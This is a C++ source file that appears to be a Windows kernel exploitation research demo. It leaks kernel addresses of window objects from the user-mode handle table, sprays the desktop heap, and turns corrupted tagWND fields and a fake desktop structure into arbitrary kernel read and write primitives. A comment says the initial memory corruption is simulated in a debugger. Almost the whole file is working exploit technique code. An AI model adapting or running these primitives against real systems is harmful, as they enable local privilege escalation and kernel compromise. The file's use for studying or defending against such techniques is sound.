// tagWnd.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <Windows.h>
#include "ntos.h"

typedef struct _DESKTOPINFO
{
	/* 000 */ PVOID        pvDesktopBase;
	/* 008 */ PVOID        pvDesktopLimit;

} DESKTOPINFO, *PDESKTOPINFO;


typedef struct _CLIENTINFO
{
	/* 000 */ DWORD             CI_flags;
	/* 004 */ DWORD             cSpins;
	/* 008 */ DWORD             dwExpWinVer;
	/* 00c */ DWORD             dwCompatFlags;
	/* 010 */ DWORD             dwCompatFlags2;
	/* 014 */ DWORD             dwTIFlags;
	/* 018 */ DWORD				filler1;
	/* 01c */ DWORD				filler2;
	/* 020 */ PDESKTOPINFO      pDeskInfo;
	/* 028 */ ULONG_PTR         ulClientDelta;

} CLIENTINFO, *PCLIENTINFO;

typedef struct _HANDLEENTRY {
	PVOID  phead;
	ULONG_PTR  pOwner;
	BYTE  bType;
	BYTE  bFlags;
	WORD  wUniq;
}HANDLEENTRY, *PHANDLEENTRY;


typedef struct _SERVERINFO {
	DWORD dwSRVIFlags;
	DWORD64 cHandleEntries;
	WORD wSRVIFlags;
	WORD wRIPPID;
	WORD wRIPError;
}SERVERINFO, *PSERVERINFO;

typedef struct _SHAREDINFO {
	PSERVERINFO psi;
	PHANDLEENTRY aheList;
	ULONG HeEntrySize;
	ULONG_PTR pDispInfo;
	ULONG_PTR ulSharedDelta;
	ULONG_PTR awmControl;
	ULONG_PTR DefWindowMsgs;
	ULONG_PTR DefWindowSpecMsgs;
}SHAREDINFO, *PSHAREDINFO;

typedef struct _LARGE_UNICODE_STRING {
	ULONG Length;
	ULONG MaximumLength : 31;
	ULONG bAnsi : 1;
	PWSTR Buffer;
} LARGE_UNICODE_STRING, *PLARGE_UNICODE_STRING;

DWORD64 g_ulClientDelta;
PSHAREDINFO g_pSharedInfo;
PSERVERINFO g_pServerInfo;
HANDLEENTRY* g_UserHandleTable;
DWORD64 g_rpDesk;
PDWORD64 g_fakeDesktop = NULL;
DWORD64 g_winStringAddr;
DWORD64 g_PTEbase;
BOOL g_hooked;
DWORD64 g_pvDesktopBase;
PBYTE g_fakeFunc;
HWND g_window1 = NULL;
HWND g_window2 = NULL;
HWND g_window3 = NULL;
const WCHAR g_windowClassName1[] = L"Manager_Window";
const WCHAR g_windowClassName2[] = L"Worker_Window";
const WCHAR g_windowClassName3[] = L"Spray_Window";
WNDCLASSEX cls1;
WNDCLASSEX cls2;
WNDCLASSEX cls3;

extern "C" VOID NtUserDefSetText(HWND hwnd, PLARGE_UNICODE_STRING pstrText);

LRESULT CALLBACK WProc1(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	if (wParam == 0x1234)
	{
		DebugBreak();
		((PDWORD64)0x1a000070)[0] = 0x333333;
	}
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

LRESULT CALLBACK WProc2(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	if (wParam == 0x1234)
	{
		DebugBreak();
		((PDWORD64)0x1a000070)[0] = 0x111111;
	}
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

LRESULT CALLBACK WProc3(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

VOID RtlInitLargeUnicodeString(PLARGE_UNICODE_STRING plstr, CHAR* psz, UINT cchLimit)
{
	ULONG Length;
	plstr->Buffer = (WCHAR*)psz;
	plstr->bAnsi = FALSE;
	if (psz != NULL)
	{
		plstr->Length = cchLimit;
		plstr->MaximumLength = cchLimit + sizeof(UNICODE_NULL);
	}
	else
	{
		plstr->MaximumLength = 0;
		plstr->Length = 0;
	}
}

BOOL setupLeak()
{
	PTEB			teb = NtCurrentTeb();
	DWORD64 win32client = (DWORD64)teb->Win32ClientInfo;
	PCLIENTINFO pinfo = (PCLIENTINFO)win32client;
	g_ulClientDelta = pinfo->ulClientDelta;
	printf("ulClientDelta is: 0x%llx\n", g_ulClientDelta);
	PDESKTOPINFO pdesktop = pinfo->pDeskInfo;
	g_pvDesktopBase = (DWORD64)pdesktop->pvDesktopBase;
	g_pSharedInfo = (PSHAREDINFO)GetProcAddress(LoadLibraryA("user32.dll"), "gSharedInfo");
	g_UserHandleTable = g_pSharedInfo->aheList;
	g_pServerInfo = g_pSharedInfo->psi;

	return TRUE;
}

DWORD64 leakWnd(HWND hwnd)
{
	HWND kernelHandle = NULL;
	DWORD64 kernelAddr = NULL;

	for (int i = 0; i < g_pServerInfo->cHandleEntries; i++)
	{
		kernelHandle = (HWND)(i | (g_UserHandleTable[i].wUniq << 0x10));
		if (kernelHandle == hwnd)
		{
			kernelAddr = (DWORD64)g_UserHandleTable[i].phead;
			break;
		}
	}
	return kernelAddr;
}

DWORD64 leakHeapData(DWORD64 addr)
{
	DWORD64 userAddr = addr - g_ulClientDelta;

	DWORD64 data = *(PDWORD64)userAddr;

	return data;
}

BOOL leakrpDesk(DWORD64 wndAddr)
{
	DWORD64 rpDeskuserAddr = wndAddr - g_ulClientDelta + 0x18;
	g_rpDesk = *(PDWORD64)rpDeskuserAddr;
	return TRUE;
}

BOOL createWnd()
{
	cls1.cbSize = sizeof(WNDCLASSEX);
	cls1.style = 0;
	cls1.lpfnWndProc = WProc1;
	cls1.cbClsExtra = 0;
	cls1.cbWndExtra = 8;
	cls1.hInstance = NULL;
	cls1.hCursor = NULL;
	cls1.hIcon = NULL;
	cls1.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	cls1.lpszMenuName = NULL;
	cls1.lpszClassName = g_windowClassName1;
	cls1.hIconSm = NULL;

	if (!RegisterClassEx(&cls1))
	{
		printf("Failed to initialize: %d\n", GetLastError());
		return FALSE;
	}

	cls2.cbSize = sizeof(WNDCLASSEX);
	cls2.style = 0;
	cls2.lpfnWndProc = WProc2;
	cls2.cbClsExtra = 0;
	cls2.cbWndExtra = 8;
	cls2.hInstance = NULL;
	cls2.hCursor = NULL;
	cls2.hIcon = NULL;
	cls2.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	cls2.lpszMenuName = NULL;
	cls2.lpszClassName = g_windowClassName2;
	cls2.hIconSm = NULL;

	if (!RegisterClassEx(&cls2))
	{
		printf("Failed to initialize: %d\n", GetLastError());
		return FALSE;
	}

	cls3.cbSize = sizeof(WNDCLASSEX);
	cls3.style = 0;
	cls3.lpfnWndProc = WProc3;
	cls3.cbClsExtra = 0;
	cls3.cbWndExtra = 8;
	cls3.hInstance = NULL;
	cls3.hCursor = NULL;
	cls3.hIcon = NULL;
	cls3.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	cls3.lpszMenuName = NULL;
	cls3.lpszClassName = g_windowClassName3;
	cls3.hIconSm = NULL;

	if (!RegisterClassEx(&cls3))
	{
		printf("Failed to initialize: %d\n", GetLastError());
		return FALSE;
	}

	//perform the desktop heap feng shui
	DWORD size = 0x1000;
	HWND* hWnd = new HWND[size];
	for (DWORD i = 0; i < size; i++)
	{
		hWnd[i] = CreateWindowEx(WS_EX_CLIENTEDGE, g_windowClassName3, L"Sprayer", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 240, 120, NULL, NULL, NULL, NULL);
	}

	DestroyWindow(hWnd[0xE00]);

	g_window1 = CreateWindowEx(WS_EX_CLIENTEDGE, g_windowClassName1, L"Manager", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 240, 120, NULL, NULL, NULL, NULL);

	if (g_window1 == NULL)
	{
		printf("Failed to create window: %d\n", GetLastError());
		return FALSE;
	}

	DestroyWindow(hWnd[0xE01]);
	g_window2 = CreateWindowEx(WS_EX_CLIENTEDGE, g_windowClassName2, L"Worker", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 240, 120, NULL, NULL, NULL, NULL);

	if (g_window2 == NULL)
	{
		printf("Failed to create window: %d\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

VOID setupFakeDesktop()
{
	g_fakeDesktop = (PDWORD64)VirtualAlloc((LPVOID)0x2a000000, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	memset(g_fakeDesktop, 0x11, 0x1000);
}

VOID setupPrimitive()
{
	g_winStringAddr = leakHeapData(leakWnd(g_window2) + 0xe0);
	leakrpDesk(leakWnd(g_window2));
	setupFakeDesktop();
}



DWORD64 readQWORD(DWORD64 addr)
{
	//The top part of the code is to make sure that the address is not odd
	DWORD size = 0x18;
	DWORD offset = addr & 0xF;
	addr -= offset;

	WCHAR* data = new WCHAR[size + 1];
	ZeroMemory(data, size + 1);
	g_fakeDesktop[0xF] = addr - 0x100;
	g_fakeDesktop[0x10] = 0x200;

	SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

	SetWindowLongPtr(g_window1, 0x118, addr);
	SetWindowLongPtr(g_window1, 0x110, 0x0000002800000020);
	SetWindowLongPtr(g_window1, 0x50, (DWORD64)g_fakeDesktop);

	DWORD res = InternalGetWindowText(g_window2, data, size);

	SetWindowLongPtr(g_window1, 0x50, g_rpDesk);
	SetWindowLongPtr(g_window1, 0x110, 0x0000000e0000000c);
	SetWindowLongPtr(g_window1, 0x118, g_winStringAddr);

	SetPriorityClass(GetCurrentProcess(), NORMAL_PRIORITY_CLASS);
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);

	CHAR* tmp = (CHAR*)data;
	DWORD64 value = *(PDWORD64)((DWORD64)data + offset);

	return value;
}

VOID writeQWORDOld(DWORD64 addr, DWORD64 value)
{
	CHAR* input = new CHAR[0x8];
	LARGE_UNICODE_STRING uStr;
	
	for (DWORD i = 0; i < 8; i++)
	{
		input[i] = (value >> (8 * i)) & 0xFF;
	}

	RtlInitLargeUnicodeString(&uStr, input, 0x8);

	SetWindowLongPtr(g_window1, 0x118, addr);
	NtUserDefSetText(g_window2, &uStr);
	//cleanup
	SetWindowLongPtr(g_window1, 0x118, g_winStringAddr);
}

VOID writeQWORD(DWORD64 addr, DWORD64 value)
{
	//The top part of the code is to make sure that the address is not odd
	DWORD offset = addr & 0xF;
	addr -= offset;
	DWORD64 filler;
	DWORD64 size = 0x8 + offset;
	CHAR* input = new CHAR[size];
	LARGE_UNICODE_STRING uStr;

	if (offset != 0)
	{
		filler = readQWORD(addr);
	}

	for (DWORD i = 0; i < offset; i++)
	{
		input[i] = (filler >> (8 * i)) & 0xFF;
	}

	for (DWORD i = 0; i < 8; i++)
	{
		input[i + offset] = (value >> (8 * i)) & 0xFF;
	}

	RtlInitLargeUnicodeString(&uStr, input, size);

	g_fakeDesktop[0x1] = 0;
	g_fakeDesktop[0xF] = addr - 0x100;
	g_fakeDesktop[0x10] = 0x200;

	SetWindowLongPtr(g_window1, 0x118, addr);
	SetWindowLongPtr(g_window1, 0x110, 0x0000002800000020);
	SetWindowLongPtr(g_window1, 0x50, (DWORD64)g_fakeDesktop);

	NtUserDefSetText(g_window2, &uStr);
	//cleanup
	SetWindowLongPtr(g_window1, 0x50, g_rpDesk);
	SetWindowLongPtr(g_window1, 0x110, 0x0000000e0000000c);
	SetWindowLongPtr(g_window1, 0x118, g_winStringAddr);
}


int main()
{
	LoadLibraryA("user32.dll");
	createWnd();
	setupLeak();
	setupPrimitive();

	//Debug output buffer
	PDWORD64 buffer = (PDWORD64)VirtualAlloc((PVOID)0x1a000000, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if ((DWORD64)buffer != 0x1a000000)
	{
		printf("Could not allocate buffer correctly: 0x%llx\n", buffer);
	}

	printf("Window1 is at: 0x%llx\n", leakWnd(g_window1));
	buffer[0] = leakWnd(g_window1);
	printf("Window2 is at: 0x%llx\n", leakWnd(g_window2));
	buffer[1] = leakWnd(g_window2);
	//This is the cbwndExtra field of the first window - manually modify it to simulate a w-w-w, 0x1000 is more than enough.
	buffer[2] = leakWnd(g_window1) + 0xe8;


	Sleep(1000);
	DebugBreak();

	buffer[3] = readQWORD(0xfffff78000000000);

	writeQWORD(0xfffff78000000800, 0x4141414142424242);

	DebugBreak();

	return 0;
}

